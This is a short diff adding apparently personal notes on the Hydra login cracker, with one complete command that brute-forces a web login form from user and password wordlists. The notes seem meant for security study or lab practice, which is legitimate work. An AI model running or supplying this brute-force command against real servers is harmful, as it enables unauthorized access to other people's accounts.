@@ -1,0 +1,12 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  HYDRA
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-04[Aug-Tue]14-07PM 
+
+Hydra is a parallelized login cracker which supports numerous protocols to attack.
+
+IS AN ONLINE CRACKER, WORKS ON LIVE SERVER
+
+hydra -L users.txt -P passwords.txt url http-post-form "/index.php:username=^USER^&password=^PASS^&Submit=Sign+in:Nope."
